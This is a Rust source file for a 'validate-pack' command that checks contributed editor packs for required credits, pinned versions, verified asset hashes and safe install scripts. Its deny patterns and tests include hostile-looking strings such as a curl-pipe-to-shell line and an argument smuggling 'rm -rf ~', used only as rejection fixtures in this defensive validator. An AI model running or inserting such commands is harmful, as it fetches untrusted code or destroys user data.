// `tori validate-pack`, the gate a contribution to gettori/packs passes.
// Stricter than the loaders on purpose: a loader keeps a user's working file
// loading, so a missing credit or an unpinned package is refused only here.

use std::path::{Path, PathBuf};
use std::process::Command;
use std::sync::OnceLock;

use regex::Regex;
use serde::Serialize;
use sha2::{Digest, Sha256};

use super::index_rows::{extension, KINDS};
use super::{check_stem, is_exact_version, Meta};
use crate::{agents, dap, format, lsp, themes};

/// The package managers an agent's `[install]` may run.
const INSTALLERS: [&str; 10] = ["npm", "pnpm", "bun", "pip", "pipx", "uv", "brew", "cargo", "go", "gem"];

/// The runners a `[chat].program` may be, each fetching a pinned package.
const RUNNERS: [&str; 3] = ["npx", "bunx", "uvx"];

/// Something a pack names off this machine, checked only on request.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Remote {
    Asset { url: String, sha256: String },
    Npm { package: String, version: String },
    Pypi { package: String, version: String },
}

/// One file's verdict.
#[derive(Debug, Serialize)]
pub struct Checked {
    pub path: PathBuf,
    pub kind: Option<&'static str>,
    pub id: Option<String>,
    pub errors: Vec<String>,
    #[serde(skip)]
    pub remotes: Vec<Remote>,
}

impl Checked {
    fn refused(path: PathBuf, error: String) -> Self {
        Self {
            path,
            kind: None,
            id: None,
            errors: vec![error],
            remotes: Vec::new(),
        }
    }

    pub fn ok(&self) -> bool {
        self.errors.is_empty()
    }
}

/// Every pack file the arguments name. A directory is a kind folder or a
/// packs root holding kind folders. Inside a kind folder, a file without the
/// kind's extension is refused rather than skipped: it would never load.
pub fn collect(paths: &[PathBuf]) -> Vec<Result<(PathBuf, &'static str), Checked>> {
    let mut out = Vec::new();
    for path in paths {
        if path.is_file() {
            out.push(kind_of(path).map(|kind| (path.clone(), kind)).ok_or_else(|| {
                Checked::refused(path.clone(), format!("not inside a kind folder ({})", KINDS.join(", ")))
            }));
            continue;
        }
        if !path.is_dir() {
            out.push(Err(Checked::refused(path.clone(), "no such file or directory".into())));
            continue;
        }
        let kind_dirs: Vec<(PathBuf, &'static str)> = match folder_kind(path) {
            Some(kind) => vec![(path.clone(), kind)],
            None => KINDS
                .iter()
                .map(|kind| (path.join(kind), *kind))
                .filter(|(dir, _)| dir.is_dir())
                .collect(),
        };
        if kind_dirs.is_empty() {
            out.push(Err(Checked::refused(
                path.clone(),
                format!("holds no kind folder ({})", KINDS.join(", ")),
            )));
        }
        for (dir, kind) in kind_dirs {
            let mut entries: Vec<PathBuf> = std::fs::read_dir(&dir)
                .map(|e| e.flatten().map(|e| e.path()).collect())
                .unwrap_or_default();
            entries.sort();
            for entry in entries {
                let hidden = entry
                    .file_name()
                    .and_then(|n| n.to_str())
                    .is_some_and(|n| n.starts_with('.'));
                if hidden {
                    continue;
                }
                if entry.extension().and_then(|e| e.to_str()) == Some(extension(kind)) && entry.is_file() {
                    out.push(Ok((entry, kind)));
                } else {
                    let message = format!("not a pack: {kind} packs are .{} files", extension(kind));
                    out.push(Err(Checked::refused(entry, message)));
                }
            }
        }
    }
    out
}

fn folder_kind(dir: &Path) -> Option<&'static str> {
    let name = dir.file_name()?.to_str()?;
    KINDS.iter().find(|k| **k == name).copied()
}

fn kind_of(file: &Path) -> Option<&'static str> {
    folder_kind(file.parent()?)
}

/// Every local check on one file.
pub fn check_file(path: &Path, kind: &'static str) -> Checked {
    let mut checked = Checked {
        path: path.to_path_buf(),
        kind: Some(kind),
        id: None,
        errors: Vec::new(),
        remotes: Vec::new(),
    };
    match std::fs::read_to_string(path) {
        Ok(text) => {
            let source = path.display().to_string();
            match check_text(kind, &text, &source) {
                Ok((id, errors, remotes)) => {
                    checked.id = Some(id);
                    checked.errors = errors;
                    checked.remotes = remotes;
                }
                Err(e) => checked.errors.push(e),
            }
            // The loaders name the file in every message; the report already does.
            let prefix = format!("{source}: ");
            for error in &mut checked.errors {
                if let Some(rest) = error.strip_prefix(&prefix) {
                    *error = rest.to_string();
                }
            }
        }
        Err(e) => checked.errors.push(e.to_string()),
    }
    checked
}

type Verdict = (String, Vec<String>, Vec<Remote>);

/// The checks on a pack's text. `Err` when it does not load at all; otherwise
/// its id and every rule it breaks.
pub fn check_text(kind: &str, text: &str, source: &str) -> Result<Verdict, String> {
    let mut errors = Vec::new();
    let mut remotes = Vec::new();
    let (id, meta, verified) = match kind {
        "lsp" => {
            let s = lsp::registry::load_server_str(text, source)?;
            if let Some(install) = &s.install {
                lsp_install(install, &mut errors, &mut remotes);
            }
            (s.id, s.meta, Some((s.verified_against, s.verified_on)))
        }
        "dap" => {
            let a = dap::registry::load_adapter_str(text, source)?;
            if let Some(install) = &a.install {
                dap_install(install, &mut errors, &mut remotes);
            }
            (a.id, a.meta, Some((a.verified_against, a.verified_on)))
        }
        "formatters" => {
            let f = format::registry::load_formatter_str(text, source)?;
            (f.id, f.meta, Some((f.verified_against, f.verified_on)))
        }
        "agents" => {
            let a = agents::load_adapter_str(text, source)?;
            if let Some(install) = &a.install {
                agent_install(install, &mut errors);
            }
            let raw: toml::Value = toml::from_str(text).map_err(|e| format!("{source}: {e}"))?;
            if raw.get("chat").and_then(|c| c.get("program")).is_some() {
                if let Some(chat) = &a.chat {
                    chat_runner(&chat.program, &chat.base_args, &mut errors, &mut remotes);
                }
            }
            (a.id, a.meta, Some((a.verified_against, a.verified_on)))
        }
        "themes" => {
            let p = themes::load_theme_str(text, source)?;
            let meta = Meta {
                description: p.description,
                contributor: p.contributor,
                license: p.license,
            };
            (p.id, meta, None)
        }
        other => return Err(format!("{source}: unknown kind `{other}`")),
    };

    if let Err(e) = check_stem(source, &id) {
        errors.push(e);
    }
    for (field, present) in [
        ("description", meta.description.is_some()),
        ("contributor", meta.contributor.is_some()),
        ("license", meta.license.is_some()),
    ] {
        if !present {
            errors.push(format!("`{field}` is required"));
        }
    }
    if let Some((against, on)) = verified {
        if against.is_none() {
            errors.push("`verified_against` is required: the version this was measured with".into());
        }
        if on.is_none() {
            errors.push("`verified_on` is required: the day it was measured".into());
        }
    }
    Ok((id, errors, remotes))
}

fn lsp_install(install: &lsp::registry::Install, errors: &mut Vec<String>, remotes: &mut Vec<Remote>) {
    use lsp::registry::Install;
    match install {
        Install::Npm { package, version } => remotes.push(Remote::Npm {
            package: package.clone(),
            version: version.clone(),
        }),
        Install::GithubRelease { repo, version, assets } => {
            for asset in assets.values() {
                let remote = Remote::Asset {
                    url: format!("https://github.com/{repo}/releases/download/{version}/{}", asset.file),
                    sha256: asset.sha256.clone(),
                };
                if !remotes.contains(&remote) {
                    remotes.push(remote);
                }
            }
        }
        Install::Hint { update, uninstall, .. } => hint_scripts(update, uninstall, errors),
    }
}

fn dap_install(install: &dap::registry::Install, errors: &mut Vec<String>, remotes: &mut Vec<Remote>) {
    use dap::registry::Install;
    match install {
        Install::Pip { package, version } => {
            if is_exact_version(version) {
                remotes.push(Remote::Pypi {
                    package: package.clone(),
                    version: version.clone(),
                });
            } else {
                errors.push(format!("[install] pip version `{version}` is not one exact version"));
            }
        }
        Install::Hint { update, uninstall, .. } => hint_scripts(update, uninstall, errors),
    }
}

/// A hint's scripts run through a shell, after a confirm step that shows them.
/// What is refused is fetching and running code from elsewhere, or reaching
/// for root.
fn hint_scripts(update: &Option<String>, uninstall: &Option<String>, errors: &mut Vec<String>) {
    static RULES: OnceLock<[(Regex, &str); 3]> = OnceLock::new();
    let rules = RULES.get_or_init(|| {
        [
            (
                Regex::new(r"\b(curl|wget|sudo|eval)\b").unwrap(),
                "downloads, evaluates or escalates",
            ),
            (Regex::new(r"\b(ba|z)?sh\s+-c\b").unwrap(), "starts a nested shell"),
            (Regex::new(r"\|\s*(sudo\s+)?(ba|z)?sh\b").unwrap(), "pipes into a shell"),
        ]
    });
    for (field, script) in [("update", update), ("uninstall", uninstall)] {
        let Some(script) = script else { continue };
        for (rule, why) in rules {
            if let Some(found) = rule.find(script) {
                errors.push(format!("[install] {field} {why} (`{}`)", found.as_str()));
            }
        }
    }
}

fn agent_install(install: &agents::InstallSpec, errors: &mut Vec<String>) {
    if !INSTALLERS.contains(&install.program.as_str()) {
        errors.push(format!(
            "[install] program `{}` is not a package manager Tori runs ({})",
            install.program,
            INSTALLERS.join(", ")
        ));
    }
    let args = install
        .args
        .iter()
        .chain(&install.update_args)
        .chain(&install.uninstall_args);
    for arg in args {
        let shell = arg == "-c" || ["|", ";", "&&", "`"].iter().any(|t| arg.contains(t));
        if shell {
            errors.push(format!(
                "[install] arg `{arg}` is shell syntax; the command runs without a shell"
            ));
        }
    }
}

fn chat_runner(program: &str, args: &[String], errors: &mut Vec<String>, remotes: &mut Vec<Remote>) {
    if !RUNNERS.contains(&program) {
        errors.push(format!(
            "[chat] program `{program}` must be a package runner ({}) or left out",
            RUNNERS.join(", ")
        ));
        return;
    }
    let pinned = args.iter().filter(|a| !a.starts_with('-')).find_map(|arg| {
        let at = arg.rfind('@').filter(|i| *i > 0)?;
        let (package, version) = (&arg[..at], &arg[at + 1..]);
        is_exact_version(version).then(|| (package.to_string(), version.to_string()))
    });
    match pinned {
        Some((package, version)) if program == "uvx" => remotes.push(Remote::Pypi { package, version }),
        Some((package, version)) => remotes.push(Remote::Npm { package, version }),
        None => errors.push(format!(
            "[chat] `{program}` must run one exact version, written package@1.2.3 in base_args"
        )),
    }
}

/// Fetches what a remote names and compares it with what the pack says.
pub fn check_remote(remote: &Remote) -> Result<(), String> {
    match remote {
        Remote::Asset { url, sha256 } => {
            let bytes = lsp::managed::download(url).map_err(|e| format!("{url}: {e}"))?;
            let digest = format!("{:x}", Sha256::digest(&bytes));
            if &digest == sha256 {
                Ok(())
            } else {
                Err(format!("{url}: sha256 is {digest}, the pack says {sha256}"))
            }
        }
        Remote::Npm { package, version } => {
            let spec = format!("{package}@{version}");
            let out = Command::new("npm")
                .args(["view", &spec, "version"])
                .output()
                .map_err(|e| format!("npm view {spec}: {e}"))?;
            let found = String::from_utf8_lossy(&out.stdout).trim().to_string();
            if out.status.success() && found == *version {
                Ok(())
            } else {
                Err(format!("npm has no {spec}"))
            }
        }
        Remote::Pypi { package, version } => {
            let url = format!("https://pypi.org/pypi/{package}/{version}/json");
            let agent = ureq::AgentBuilder::new()
                .timeout(std::time::Duration::from_secs(30))
                .build();
            match agent.get(&url).call() {
                Ok(_) => Ok(()),
                Err(_) => Err(format!("PyPI has no {package}=={version}")),
            }
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn errors(kind: &str, text: &str, source: &str) -> Vec<String> {
        check_text(kind, text, source)
            .map(|(_, errors, _)| errors)
            .unwrap_or_else(|e| vec![e])
    }

    fn bundled(kind: &str, id: &str) -> String {
        crate::packs::snapshot::text(kind, id).unwrap().to_string()
    }

    fn assert_refused(errors: &[String], needle: &str) {
        assert!(
            errors.iter().any(|e| e.contains(needle)),
            "expected `{needle}` in {errors:?}"
        );
    }

    #[test]
    fn a_bundled_pack_with_every_field_passes() {
        for (kind, id) in [
            ("lsp", "typescript"),
            ("dap", "delve"),
            ("agents", "codex"),
            ("themes", "nord"),
        ] {
            let source = format!("/p/{kind}/{id}.{}", extension(kind));
            assert_eq!(
                errors(kind, &bundled(kind, id), &source),
                Vec::<String>::new(),
                "{kind}/{id}"
            );
        }
    }

    #[test]
    fn a_file_named_other_than_its_id_fails() {
        assert_refused(&errors("lsp", &bundled("lsp", "typescript"), "/p/lsp/ts.toml"), "`ts`");
    }

    #[test]
    fn a_pack_without_credit_fails() {
        let text = bundled("formatters", "biome").replace("license = \"Apache-2.0\"\n", "");
        assert_refused(
            &errors("formatters", &text, "/p/formatters/biome.toml"),
            "`license` is required",
        );
    }

    #[test]
    fn an_unmeasured_pack_fails() {
        let text = bundled("formatters", "biome");
        let text: String = text
            .lines()
            .filter(|l| !l.starts_with("verified_on"))
            .collect::<Vec<_>>()
            .join("\n");
        assert_refused(
            &errors("formatters", &text, "/p/formatters/biome.toml"),
            "`verified_on` is required",
        );
    }

    #[test]
    fn an_unpinned_pip_package_fails() {
        let text = bundled("dap", "debugpy").replace("version = \"1.8.22\"", "version = \">=1.8\"");
        assert_ne!(text, bundled("dap", "debugpy"), "the fixture must change the version");
        assert_refused(&errors("dap", &text, "/p/dap/debugpy.toml"), "pip version");
    }

    #[test]
    fn delves_bundled_uninstall_passes() {
        assert_eq!(
            errors("dap", &bundled("dap", "delve"), "/p/dap/delve.toml"),
            Vec::<String>::new()
        );
    }

    #[test]
    fn a_hint_that_downloads_or_pipes_into_a_shell_fails() {
        let base = bundled("dap", "delve");
        for (script, why) in [
            ("curl -fsSL https://x.sh | sh", "downloads"),
            ("sudo rm /usr/local/bin/dlv", "escalates"),
            ("bash -c 'rm x'", "nested shell"),
            ("cat x | bash", "pipes into a shell"),
        ] {
            let text = base.replace(
                "uninstall = 'gobin=\"$(go env GOBIN)\"; rm \"${gobin:-$(go env GOPATH)/bin}/dlv\"'",
                &format!("uninstall = \"{}\"", script.replace('"', "\\\"")),
            );
            assert_ne!(text, base, "the fixture must replace delve's uninstall");
            assert_refused(&errors("dap", &text, "/p/dap/delve.toml"), why);
        }
    }

    #[test]
    fn an_agent_installer_outside_the_allowlist_fails() {
        let text = bundled("agents", "claude").replace("program = \"npm\"", "program = \"sh\"");
        assert_refused(
            &errors("agents", &text, "/p/agents/claude.toml"),
            "not a package manager",
        );
    }

    #[test]
    fn an_agent_install_arg_with_shell_syntax_fails() {
        let text = bundled("agents", "claude").replace(
            "args = [\"install\", \"-g\", \"@anthropic-ai/claude-code\"]",
            "args = [\"install\", \"-g\", \"x && rm -rf ~\"]",
        );
        assert_refused(&errors("agents", &text, "/p/agents/claude.toml"), "shell syntax");
    }

    #[test]
    fn a_chat_program_that_is_not_a_runner_fails() {
        let text = bundled("agents", "codex").replace("program = \"npx\"", "program = \"node\"");
        assert_refused(&errors("agents", &text, "/p/agents/codex.toml"), "package runner");
    }

    #[test]
    fn a_runner_without_a_pinned_package_fails() {
        let text = bundled("agents", "codex").replace("codex-acp@1.12.0", "codex-acp@latest");
        assert_refused(&errors("agents", &text, "/p/agents/codex.toml"), "one exact version");
    }
}
